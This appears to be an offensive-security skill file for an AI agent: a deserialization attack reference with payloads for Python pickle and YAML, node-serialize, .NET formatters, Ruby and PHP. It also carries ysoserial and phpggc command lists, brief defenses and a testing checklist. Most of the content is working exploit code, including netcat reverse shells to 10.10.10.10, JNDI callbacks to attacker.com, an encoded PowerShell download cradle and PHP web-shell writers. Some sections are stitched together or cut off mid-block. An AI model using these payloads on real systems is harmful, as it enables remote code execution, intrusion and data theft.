- `g` (GET): Retrieve from memo
- `0` (POP): Pop stack
- `1` (POP_MARK): Pop to mark
- `2` (DUP): Duplicate top
- `P` (PERSID): Persistent load
- `I` (INT): Push integer
- `F` (FLOAT): Push float
- `L` (LONG): Push long
- `M` (BININT): Push binary int
- `T` (TUPLE2): Build 2-item tuple
- `\x80` (PROTO): Protocol header (`\x80\x02`, `\x80\x03`, `\x80\x04`, `\x80\x05`)

**Manual RCE Payload Construction:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/sh 10.10.10.10 4444',))

payload = pickle.dumps(RCE())

# b'\x80\x04\x95...\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c...'
```

**Advanced Pickle Gadgets:**

**Subprocess Execution:**
```python
import subprocess
class SubprocessRCE:
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh', '-c', 'whoami'],))
```

**Eval Execution:**
```python
class EvalRCE:
    def __reduce__(self):
        return (eval, ("__import__('os').system('whoami')",))
```

**Import + Module Execution:**
```python
class ImportRCE:
    def __reduce__(self):
        return (__import__('os').system, ('whoami',))
```

**Pickle Protocol Manipulation:**
```python

# Protocol 4 (Python 3.4+)
\x80\x04\x95...\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c...
```

**Pickle + Base64 Encoding:**
```python
import base64
import pickle

class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').system('whoami')",))

b64_payload = base64.b64encode(pickle.dumps(RCE()))

# gASVCgAAAAAAAACMBXRlc3SFlC4=
```

**Pickle + JSON Wrapping:**
Some APIs accept JSON that gets passed to `pickle.loads()`:
```json
{"py/object": "__main__.RCE", "cmd": "whoami"}
```

### 4.2 PyYAML Deserialization
**Vulnerable API:**
```python
import yaml
data = yaml.load(stream, Loader=yaml.Loader)      # Vulnerable
data = yaml.load(stream, Loader=yaml.FullLoader)  # Vulnerable to some attacks
data = yaml.load(stream, Loader=yaml.UnsafeLoader) # Vulnerable
data = yaml.safe_load(stream)                      # Safe
```

**RCE Payloads:**
```yaml

# !!python/object/new (creates object with args)
!!python/object/new:subprocess.Popen [["/bin/sh", "-c", "nc -e /bin/sh 10.10.10.10 4444"]]

# !!python/object/apply with eval
!!python/object/apply:builtins.eval ["__import__('os').system('whoami')"]

# !!python/object/apply with getattr chain
!!python/object/apply:builtins.getattr [!!python/object/apply:builtins.getattr [!!python/object/apply:builtins.import ["os"], "system"], "call"] ["whoami"]

# Custom class instantiation
!!python/object:__main__.Exploit
cmd: "whoami"
```

**Ruamel.yaml Exploitation:**
```python
from ruamel.yaml import YAML
yaml = YAML(typ='unsafe')  # Vulnerable
data = yaml.load(stream)
```

### 4.3 Django Session Deserialization
**Format:** Base64-encoded pickle (signed with SECRET_KEY)

**Session Structure:**
```python

# Session data: base64(pickle(session_dict))
```

**Exploitation (if SECRET_KEY known):**
1. Craft malicious pickle payload
2. Sign with Django's signing algorithm
3. Replace session cookie

**Django Pickle Gadget:**
```python

# django/contrib/sessions/serializers.py PickleSerializer

import pickle
import django.contrib.sessions.serializers

class DjangoRCE:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

payload = django.contrib.sessions.serializers.PickleSerializer().dumps({'test': DjangoRCE()})
```

### 4.4 Python Marshal
**Format:** Python's internal object serialization (`.pyc` files)

**Vulnerable API:**
```python
import marshal
data = b'...'
obj = marshal.loads(data)  # Can execute code if contains code objects
```

**Code Object Execution:**
```python
import marshal
import types

# Compile malicious code
code = compile('import os; os.system("whoami")', '<string>', 'exec')
payload = marshal.dumps(code)

### 4.5 Python Shelve / DBM
**Format:** Persistent dictionary using pickle

**Vulnerable API:**
```python
import shelve
db = shelve.open('database')  # Underlying pickle deserialization
value = db['key']             # Triggers pickle.loads on stored data
```

### 4.6 Python XML-RPC
**Format:** XML

**Vulnerable API:**
```python
import xmlrpc.client
server = xmlrpc.client.ServerProxy("http://target.com")

### 5.1 `node-serialize` / `serialize-javascript`
**Format:** Custom serialization with function support

**Vulnerable API:**
```javascript
var serialize = require('node-serialize');
var obj = serialize.unserialize(payload);  // Vulnerable
```

**RCE Payload:**
```javascript
// Immediate execution via IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh 10.10.10.10 4444', function(error, stdout, stderr) { console.log(stdout) });}()"}

// Without IIFE (executes on access)
{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString();}"}
```

**Payload Structure:**
- `_$$ND_FUNC$$_` prefix marks serialized function
- Append `()` for immediate invocation during deserialization
- Use `require('child_process')` for command execution

**serialize-javascript Variants:**
```javascript
// serialize-javascript with function serialization
{"foo":"bar","rce":"function(){require('child_process').execSync('calc')}"}
```

### 5.2 `vm` Module Sandbox Escape
**Vulnerable Pattern:**
```javascript
const vm = require('vm');
const context = { console };
vm.createContext(context);
vm.runInContext(untrustedCode, context);  // May be escapable
```

**Escape Techniques:**

**Prototype Pollution Escape:**
```javascript
// Pollute Object.prototype to escape sandbox
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()
```

**Context Escape via `this.constructor`:**
```javascript
// Access main context through constructor chain
const process = this.constructor.constructor('return process')();
const require = process.mainModule.require;
const { execSync } = require('child_process');
execSync('whoami');
```

**Error Stack Trace Escape:**
```javascript
// Force error to leak context
try {
    this.a.b.c;
} catch(e) {
    const process = e.constructor.constructor('return process')();
    process.mainModule.require('child_process').exec('nc -e /bin/sh 10.10.10.10 4444');
}
```

**Symbol.toStringTag Escape:**
```javascript
// Abuse Symbol.toStringTag to get real context
var process = this[Symbol.toStringTag].constructor.constructor('return process')();
```

### 5.3 Prototype Pollution via Deserialization
**Concept:** Deserialized objects can modify `Object.prototype`, affecting all objects.

**Pollution Payloads:**
```javascript
// Pollute __proto__ via JSON deserialization
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}

// Pollute via merge operations
Object.assign({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
```

**RCE via Prototype Pollution + Deserialization:**
1. Pollute `Object.prototype.shell` or similar
2. Trigger code path that executes polluted property
3. Chain with `child_process` methods

### 5.4 `cryo` Deserialization
**Format:** JSON-based serialization

**Vulnerable API:**
```javascript
var cryo = require('cryo');
var obj = cryo.parse(payload);  // Vulnerable to RCE
```

**RCE Payload:**
```javascript
// cryo uses Function constructor for methods
{"root":"C","objects":{"C":{"prototype":"P","__proto__":"P","constructor":"F"}},"prototypes":{"P":{"eval":"F"}},"functions":{"F":"function(){require('child_process').execSync('whoami')}"}}
```

### 5.5 `funcster` Deserialization
**Format:** JSON with function serialization

**Vulnerable API:**
```javascript
var funcster = require('funcster');
var obj = funcster.deserialize(serialized);  // Uses eval() on function strings
```

### 5.6 XML Deserialization (Node.js)
**xml2js / fast-xml-parser:**
```javascript
// XXE + SSRF via XML parsing
const xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
```

### 5.7 JavaScript `eval()` / `new Function()` via JSON
Some applications deserialize JSON then pass properties to `eval()`:
```javascript
var data = JSON.parse(userInput);
eval(data.expression);  // If expression is attacker-controlled
```

---

### 6.1 BinaryFormatter
**Format:** Binary, magic bytes `00 01 00 00 00`

**Vulnerable API:**
```csharp
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // Vulnerable
```

**Gadgets:**

**TypeConfuseDelegate (ysoserial.net):**
```bash

# ObjectDataProvider (WPF)
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8AcwBoAC4AcABzADEAJwApAA=="
```

**ActivitySurrogateSelector Chain (Detailed):**
```
ActivitySurrogateSelector.ReadObject()
  → ActivitySurrogateSelector.GetObjectData()
    → WorkflowActivitySurrogate.GetObjectData()
      → Activity.GetWorkflowTree()
        → Activity.Initialize()
          → XamlReader.Parse()
            → ObjectDataProvider.MethodParameters
              → Process.Start()
```

### 6.2 LosFormatter
**Format:** Hex-encoded BinaryFormatter (ASP.NET ViewState)

**Vulnerable API:**
```csharp
LosFormatter lf = new LosFormatter();
object obj = lf.Deserialize(viewStateString);  // Vulnerable
```

**ViewState Exploitation:**
```bash

# Generate ViewState payload (requires machineKey or known keys)
ysoserial.exe -f LosFormatter -g ObjectDataProvider -o base64 -c "whoami"

# With known machineKey (validationKey + decryptionKey)
ysoserial.exe -p ViewState -g ObjectDataProvider -c "whoami" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### 6.3 SoapFormatter
**Format:** XML SOAP

**Vulnerable API:**
```csharp
SoapFormatter sf = new SoapFormatter();
object obj = sf.Deserialize(stream);  // Vulnerable
```

**Payload Generation:**
```bash
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -o raw -c "calc.exe"
```

### 6.4 JSON.NET (Newtonsoft.Json)
**Format:** JSON

**Vulnerable Configuration:**
```csharp
JsonSerializerSettings settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // Dangerous
};
object obj = JsonConvert.DeserializeObject(json, settings);
```

**TypeNameHandling Values (Risk Level):**
- `None` — Safe
- `Objects` — Vulnerable
- `Arrays` — Vulnerable
- `Auto` — Conditionally vulnerable
- `All` — Most vulnerable

**Payloads:**
```json
// ObjectDataProvider gadget (WPF)
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","$values":["cmd","/c whoami"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}

// TypeConfuseDelegate
{"$type":"System.Windows.Forms.AxHost+State, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","PropertyBag":{"$type":"System.Windows.Forms.PropertyBag, System.Windows.Forms"}}

// SessionSecurityToken (Claims)
{"$type":"System.IdentityModel.Tokens.SessionSecurityToken, System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","SecureConversationVersion":{"$type":"System.Uri, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","Value":"http://attacker.com"}}

// WindowsIdentity (impersonation + deserialization)
{"$type":"System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","System.Security.ClaimsIdentity.actor":"AAEAAAD...BASE64_GADGET..."}
```

**JSON.NET Bypass Techniques:**
```json
// TypeNameAssemblyFormat.Full (requires full assembly name)
{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}

// Using $type in nested objects
{"user":{"$type":"VulnerableClass, Assembly","cmd":"whoami"}}

// Array-based gadgets
{"$type":"System.Collections.Generic.List`1[[System.Object, mscorlib]], mscorlib","$values":[{"$type":"System.Windows.Data.ObjectDataProvider...","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process..."}}]}
```

### 6.5 JavaScriptSerializer
**Format:** JSON (ASP.NET AJAX)

**Vulnerable Configuration:**
```csharp
JavaScriptSerializer jss = new JavaScriptSerializer();
jss.RegisterConverters(new[] { new SimpleTypeResolver() });  // Vulnerable
object obj = jss.Deserialize<object>(json);
```

**Payload:**
```json
{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"__type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","__arrayType":"System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","__array":[{"__type":"System.String, mscorlib"},"cmd","/c whoami"]},"ObjectInstance":{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}
```

### 6.6 DataContractSerializer
**Format:** XML

**Vulnerable Configuration:**
```csharp
DataContractSerializer dcs = new DataContractSerializer(typeof(object));  // Dangerous
object obj = dcs.ReadObject(xmlReader);
```

**Payload:**
```xml
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LiteralControl,System.Web],[System.Windows.Data.ObjectDataProvider,PresentationFramework]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089">
  <ExpandedWrapperOfLiteralControlObjectDataProvider xmlns="http://schemas.datacontract.org/2004/07/System.Data.Services.Internal" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <ExpandedElement>
      <LiteralControl xmlns="http://schemas.datacontract.org/2004/07/System.Web.UI" Text=""/>
    </ExpandedElement>
    <ProjectedProperty0>
      <ObjectDataProvider xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data" MethodName="Start" ObjectInstance="{x:Type Diag:Process}">
        <MethodParameters>
          <anyType xmlns:d1p1="http://www.w3.org/2001/XMLSchema" i:type="d1p1:string" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">cmd</anyType>
          <anyType xmlns:d1p1="http://www.w3.org/2001/XMLSchema" i:type="d1p1:string" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">/c whoami</anyType>
        </MethodParameters>
      </ObjectDataProvider>
    </ProjectedProperty0>
  </ExpandedWrapperOfLiteralControlObjectDataProvider>
</root>
```

### 6.7 XmlSerializer
**Format:** XML

**Vulnerable when type is attacker-controlled:**
```csharp
XmlSerializer xs = new XmlSerializer(Type.GetType(attackerControlledType));
object obj = xs.Deserialize(stream);
```

### 6.8 ObjectStateFormatter
**Format:** Base64-encoded binary (ASP.NET)

**Vulnerable API:**
```csharp
ObjectStateFormatter osf = new ObjectStateFormatter();
object obj = osf.Deserialize(stateString);  // Vulnerable
```

### 6.9 NetDataContractSerializer
**Format:** XML with full type information

**Vulnerable API:**
```csharp
NetDataContractSerializer ndcs = new NetDataContractSerializer();
object obj = ndcs.ReadObject(stream);  // Vulnerable
```

# PowerShell remoting deserialization
$client = New-Object System.Management.Automation.Runspaces.WSManConnectionInfo
$runspace = [RunspaceFactory]::CreateRunspace($client)
$pipeline = $runspace.CreatePipeline()
$pipeline.Commands.AddScript("whoami")
```

---

### 7.1 Ruby Marshal
**Format:** Binary, magic bytes `\x04\x08`

**Vulnerable API:**
```ruby
data = "\x04\x08..."
obj = Marshal.load(data)  # Vulnerable
```

**RCE Payload:**
```ruby

# Custom __send__ chain
class RCE
  def initialize
    @chain = [
      :instance_eval,
      "require 'socket'; TCPSocket.new('10.10.10.10', 4444).puts('pwned')"
    ]
  end
end
```

**Rails Session Deserialization:**
- Rails uses `Marshal` or `JSON` for sessions (configurable)
- Signed with `secret_key_base`
- If `secret_key_base` leaked, craft malicious session cookie

### 7.2 Go gob
**Format:** Binary, magic bytes `0xff 0x81` or `0xff 0x82`

**Vulnerable API:**
```go
dec := gob.NewDecoder(reader)
var obj interface{}
dec.Decode(&obj)  // Can instantiate arbitrary types if registered
```

**Limitations:** Go's type system makes RCE harder, but DoS and type confusion are possible.

### 7.3 Rust serde
**Format:** JSON, Bincode, MessagePack, etc.

**Vulnerable when:**
- Using `serde` with `#[serde(deny_unknown_fields)]` disabled
- Deserializing to `serde_json::Value` then casting
- Custom `Deserialize` implementations with unsafe code

### 7.4 Perl Storable
**Format:** Binary

**Vulnerable API:**
```perl
use Storable;
my $obj = thaw($data);  # Vulnerable
```

### 7.5 PHP unserialize in Other Formats
**MessagePack-PHP:**
```php
msgpack_unserialize($data);  // Same risks as native unserialize
```

**IgBinary:**
```php
igbinary_unserialize($data);  // Same risks
```

---

# deflate
import zlib
payload = base64.b64encode(zlib.compress(data))
```

**Unicode Escaping:**
```json
// JSON with unicode escapes
{"key":"\u0041\u0042\u0043"}
```

### 8.2 Type Confusion & Polymorphism
**Java:**
- Submit subclass instead of expected class
- Use interfaces with default gadget implementations

**PHP:**
- Submit incomplete class names (`C:11:"FakeClass":0:{}`)
- Abuse `Serializable` interface vs `__wakeup`

**.NET:**
- Use `ExpandedWrapper` to wrap unexpected types
- Abuse `ISerializable` custom constructors

### 8.3 Deserialization to SSRF
Many gadgets trigger network requests:

**Java:**
```java
// URL class in serialized object
new URL("http://attacker.com/callback")
```

**PHP:**
```php
// SimpleXMLElement with external entity
class SSRF {
    public $xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal/">]><foo>&xxe;</foo>';
    function __destruct() {
        simplexml_load_string($this->xml);
    }
}
```

**.NET:**
```json
{"$type":"System.Net.WebClient, System","BaseAddress":"http://internal/"}
```

### 8.4 Deserialization to File Write
**Java (XStream):**
```xml
<java.io.FileWriter>
  <file>/tmp/shell.jsp</file>
  <append>false</append>
</java.io.FileWriter>
```

**PHP:**
```php
class FileWrite {
    public $file = "/tmp/shell.php";
    public $data = "<?php system($_GET['cmd']); ?>";
    function __destruct() {
        file_put_contents($this->file, $this->data);
    }
}
```

**.NET:**
```json
{"$type":"System.IO.FileStream, mscorlib","Name":"/tmp/test.txt","FileMode":2}
```

### 8.5 Deserialization to Authentication Bypass
**PHP (Laravel):**
```php
// Forge remember token cookie
// Deserialize User object with isAdmin=true
O:8:"App\User":3:{s:8:"isAdmin";b:1;s:8:"username";s:5:"admin";s:12:"rememberToken";s:32:"...";}
```

**Java (Spring Security):**
```java
// Deserialize GrantedAuthority with ROLE_ADMIN
```

**.NET (ClaimsIdentity):**
```json
{"$type":"System.Security.Claims.ClaimsIdentity, mscorlib","m_userSerializationData":"AAEAAAD...","m_instanceClaims":[{"m_issuer":"LOCAL AUTHORITY","m_originalIssuer":"LOCAL AUTHORITY","m_type":"http://schemas.microsoft.com/ws/2008/06/identity/claims/role","m_value":"Admin"}]}
```

---

### A.1 Quick-Reference Payload Matrix

| Language | Format | Detection Signature | RCE Gadget |
|----------|--------|---------------------|------------|
| Java | Binary | `ac ed 00 05` / `rO0AB` | CommonsCollections, Jdk7u21 |
| Java | XML | `<java>` / `<object>` | XStream ImageIO |
| Java | JSON | `@class` / `$type` | Jackson `JdbcRowSetImpl` |
| Java | YAML | `!!` prefix | SnakeYAML `ScriptEngineManager` |
| PHP | String | `O:10:"Class"` | `__destruct` + `file_put_contents` |
| PHP | Phar | `__HALT_COMPILER()` | Metadata deserialization |
| Python | Binary | `\x80\x02` / `cos` | `__reduce__` + `os.system` |
| Python | YAML | `!!python/object/apply` | `os.system` / `subprocess.Popen` |
| Node.js | JSON | `_$$ND_FUNC$$_` | `child_process.exec` |
| Node.js | JS | `this.constructor` | `process.mainModule.require` |
| .NET | Binary | `00 01 00 00 00` | `TypeConfuseDelegate` |
| .NET | JSON | `$type` | `ObjectDataProvider` |
| .NET | XML | `ExpandedWrapper` | `ObjectDataProvider` |

# Detection (universal, no libraries needed)
java -jar ysoserial.jar URLDNS 'http://your-burpcollaborator.net'

# CommonsCollections (check library version first)
java -jar ysoserial.jar CommonsCollections1 'command'
java -jar ysoserial.jar CommonsCollections2 'command'
java -jar ysoserial.jar CommonsCollections3 'command'
java -jar ysoserial.jar CommonsCollections4 'command'
java -jar ysoserial.jar CommonsCollections5 'command'
java -jar ysoserial.jar CommonsCollections6 'command'
java -jar ysoserial.jar CommonsCollections7 'command'

# Spring (check Spring version)
java -jar ysoserial.jar Spring1 'command'
java -jar ysoserial.jar Spring2 'command'

# No dependencies (check Java version)
java -jar ysoserial.jar Jdk7u21 'command'
java -jar ysoserial.jar JRE8u20 'command'

# JNDI (for remote classloading)
java -jar ysoserial.jar JRMPClient 'attacker.com:1099'
java -jar ysoserial.jar JRMPListener 4444 CommonsCollections1 'command'
```

# BinaryFormatter payloads
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "whoami"
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "whoami"
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "calc"
ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "whoami"
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "notepad"
ysoserial.exe -f BinaryFormatter -g DataSet -o base64 -c "whoami"
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "whoami"

# JSON.NET payloads
ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "whoami"
ysoserial.exe -f Json.Net -g TypeConfuseDelegate -o base64 -c "whoami"

# marshalsec (JNDI/LDAP/RMI server)
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec && mvn clean package -DskipTests

# JNDI-Injection-Exploit
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases

# PHPGGC (PHP Generic Gadget Chains)
git clone https://github.com/ambionics/phpggc.git
./phpggc -l
./phpggc Laravel/RCE1 system 'whoami'
./phpggc Symfony/RCE1 system 'whoami'
./phpggc Monolog/RCE1 system 'whoami'
./phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["cmd"]); ?>'

# phpggc supports phar generation:
./phpggc -p phar Laravel/RCE1 system 'whoami' -o exploit.phar

# pickle-payload-generator
python3 -c "import pickle,os,base64; class RCE: def __reduce__(self): return (os.system,('whoami',)); print(base64.b64encode(pickle.dumps(RCE())).decode())"

# PyYAML exploit generator
python3 -c "import yaml; print(yaml.dump({'rce': type('RCE', (), {'__reduce__': lambda self: (eval, ('__import__(\"os\").system(\"whoami\")',)})()}))"

# node-serialize-payload-generator
node -e "var serialize = require('node-serialize'); var payload = {'rce': '_\$\$ND_FUNC\$\$_function(){require(\"child_process\").exec(\"whoami\", function(error, stdout, stderr) { console.log(stdout) });}()'}; console.log(serialize.serialize(payload));"

# ysoserial.net (primary payload generator)
wget https://github.com/pwntester/ysoserial.net/releases

# ViewState generator (requires machineKey)
ysoserial.exe -p ViewState -g ObjectDataProvider -c "whoami" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="..." --validationalg="SHA1" --validationkey="..."

### C.1 HTTP Parameters & Body
- `?data=` (Base64 serialized object)
- `?object=` (raw serialized stream)
- `?state=` (ViewState, session state)
- `?viewstate=` (ASP.NET)
- `?__VIEWSTATE=` (ASP.NET WebForms)
- POST body with `Content-Type: application/x-java-serialized-object`
- POST body with serialized JSON containing `$type` or `@class`
- POST body with XML containing type definitions

### C.2 Cookies
- `JSESSIONID` (Java session, sometimes contains serialized data)
- `PHPSESSID` (PHP session, serialized array)
- `ASP.NET_SessionId` (session identifier, data server-side but format reveals tech)
- `session` (Flask/Django signed cookie)
- `auth_token` (custom serialized auth token)
- `user_data` (serialized user preferences)
- `remember_me` (serialized remember token)

### C.3 Headers
- `X-Api-Version` (sometimes deserialized)
- `X-Serialized-Data`
- `Authorization: Bearer <base64-serialized-token>`
- Custom application headers containing state objects

### C.4 Message Queues
- RabbitMQ messages (Java/PHP/Python serialized objects)
- Kafka records
- Redis values (serialized session/cache data)
- ActiveMQ/JMS messages (Java serialized objects)

### C.5 File Uploads
- `.phar` files (PHP archive metadata)
- `.pkl`, `.pickle` files (Python)
- `.ser` files (Java serialized)
- `.dat` files (generic serialized data)
- Image uploads processed with `getimagesize()` (triggers phar deserialization via `phar://`)

### C.6 WebSocket Messages
- Real-time applications sending serialized state updates
- Game servers transmitting object states

---

### D.1 Never Deserialize Untrusted Data
- **Primary Rule:** Do not deserialize data from untrusted sources
- **Alternative:** Use pure data formats (JSON, XML) with schema validation
- **Type Safety:** Deserialize into strict DTOs, not `Object` or `dynamic`

### D.2 Input Validation
- **Integrity Checks:** HMAC signatures on serialized payloads
- **Size Limits:** Restrict maximum payload size
- **Depth Limits:** Restrict object nesting depth
- **Type Whitelisting:** Allow only expected types during deserialization

### D.3 Language-Specific Defenses

**Java:**
- Use `SerialKiller` or `LookAheadObjectInputStream` for class whitelist filtering
- Disable `ObjectInputStream` where possible
- Update Commons Collections, Spring, XStream, Jackson regularly
- Set `com.sun.jndi.rmi.object.trustURLCodebase=false`
- Set `com.sun.jndi.ldap.object.trustURLCodebase=false`

**PHP:**
- Never pass user input to `unserialize()`
- Use `json_encode()`/`json_decode()` instead
- If necessary, use `allowed_classes` parameter: `unserialize($data, ['allowed_classes' => ['SafeClass']])`
- Disable `phar://` wrapper if not needed: `stream_wrapper_unregister('phar')`

**Python:**
- Never unpickle untrusted data
- Use `json` instead of `pickle`
- If necessary, implement custom `Unpickler` with restricted `find_class()`
- Use `yaml.safe_load()` instead of `yaml.load()`

**Node.js:**
- Avoid `node-serialize` and `serialize-javascript` for untrusted data
- Use `JSON.parse()` with schema validation
- Avoid `eval()`, `new Function()`, `vm.runInContext()` on untrusted input
- Freeze `Object.prototype` to prevent prototype pollution: `Object.freeze(Object.prototype)`

**.NET:**
- Never use `BinaryFormatter`, `SoapFormatter`, or `LosFormatter` on untrusted data
- Use `DataContractSerializer` with known types only
- Disable `TypeNameHandling.All` in JSON.NET
- Use `TypeNameHandling.None` or strict whitelists
- Enable `AntiXss` encoding and validate deserialized types

### D.4 Monitoring & Detection
- Monitor for deserialization exceptions (`StreamCorruptedException`, `SerializationException`)
- Alert on unusual class loading patterns
- Monitor for child process spawning from application servers
- Detect outbound connections from internal services (JNDI callbacks)

---

## Testing Checklist

- [ ] Identify all deserialization entry points (parameters, cookies, headers, files, messages)
- [ ] Fingerprint serialization format (magic bytes, structure, encoding)
- [ ] Determine underlying language/framework/version
- [ ] Test for error-based deserialization detection (malformed payloads)
- [ ] Test for time-based detection (deeply nested objects)
- [ ] Test for DNS OOB via URL gadgets in serialized objects
- [ ] **Java:** Test with `ysoserial URLDNS` for blind detection
- [ ] **Java:** Test CommonsCollections1-7 based on library versions
- [ ] **Java:** Test Spring1/2, Groovy1, Jdk7u21 based on environment
- [ ] **Java:** Test Jackson/Fastjson polymorphic deserialization with `@class`/`$type`
- [ ] **Java:** Test XStream, SnakeYAML, Kryo, Hessian if applicable
- [ ] **Java:** Test JNDI injection vectors (RMI, LDAP, DNS)
- [ ] **PHP:** Test native `unserialize()` with magic method gadgets
- [ ] **PHP:** Test `phar://` wrapper on file operation endpoints
- [ ] **PHP:** Use PHPGGC to test known framework gadgets (Laravel, Symfony, Monolog, Guzzle)
- [ ] **PHP:** Test session deserialization handler mismatch
- [ ] **Python:** Test `pickle.loads()` with `__reduce__` payloads
- [ ] **Python:** Test PyYAML `yaml.load()` with `!!python/object/apply`
- [ ] **Python:** Test Django/Flask session deserialization if SECRET_KEY accessible
- [ ] **Node.js:** Test `node-serialize` with `_$$ND_FUNC$$_` payloads
- [ ] **Node.js:** Test `vm` module escape via `this.constructor.constructor`
- [ ] **Node.js:** Test prototype pollution via `__proto__` in deserialized JSON
- [ ] **.NET:** Test `BinaryFormatter` with `ysoserial.net` gadgets
- [ ] **.NET:** Test `LosFormatter` / ViewState exploitation
- [ ] **.NET:** Test JSON.NET `TypeNameHandling` with `$type` payloads
- [ ] **.NET:** Test `DataContractSerializer`, `JavaScriptSerializer` if applicable
- [ ] Test encoding bypasses (Base64, hex, gzip, URL-safe variants)
- [ ] Test type confusion and polymorphism bypasses
- [ ] Chain deserialization to SSRF, file write, or auth bypass where RCE is blocked
- [ ] Document gadget chain from entry point to dangerous method execution
- [ ] Verify impact with benign commands (`whoami`, `id`, DNS callback) before full RCE

---

**Skill Maintainer Notes:** Insecure deserialization often leads to immediate RCE with minimal effort once the correct gadget chain is identified. Always start with detection payloads (URLDNS, time-based, error-based) before attempting RCE. Maintain strict version tracking of target libraries and frameworks — gadget availability is highly version-dependent. When reporting, include the full gadget chain with class names and method calls, and provide proof-of-concept that demonstrates code execution without causing system damage.


### From `offensive-skills/offensive-deserialization/SKILL.md`

## Metadata
- **Skill Name**: insecure-deserialization
- **Folder**: offensive-deserialization
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/insecure-deserialization.md

## Description
Insecure deserialization attack checklist: identifying deserialization sinks, Java/PHP/.NET/Python deserialization exploitation, ysoserial gadget chains, magic method abuse, and detection evasion. Use when testing deserialization endpoints or developing deserialization exploits.

## Trigger Phrases
Use this skill when the conversation involves any of:
`deserialization, insecure deserialization, ysoserial, Java deserialization, PHP deserialization, .NET deserialization, pickle, gadget chain, magic method, ObjectInputStream`

# Insecure Deserialization

Happens when applications deserialize program objects without proper precaution. An attacker can then manipulate serialized objects to change program behavior and even execute code.

## Shortcut

1. Search source for deserialization that touches user input.
2. If black-box, look for large, opaque blobs (cookies, headers, bodies) and unusual content-types.
3. Identify features that must deserialize user-supplied data (session, jobs/queues, file metadata, tokens).
4. If identity is embedded, tamper to attempt auth bypass.
5. Try to escalate to RCE/logic abuse carefully and non-destructively.

## Mechanisms

- Occurs when user-controlled data is deserialized without strict allowlists and integrity checks. Exploits often occur during deserialization (magic methods, constructors), before app logic runs.
- Prefer data formats that don’t instantiate code (JSON), and disable polymorphic typing.

## Hunt

1.  **Identify Potential Inputs:**
    - HTTP parameters/headers/cookies, file uploads, message queues, caches, DB‑stored user content
2.  **Recognize Serialized Data:**
    - **PHP:** `O:<len>:"Class":...` (often Base64), PHAR archives (`phar://`)
    - **Java:** hex `ac ed 00 05` or Base64 `rO0`; XMLDecoder/XStream flows
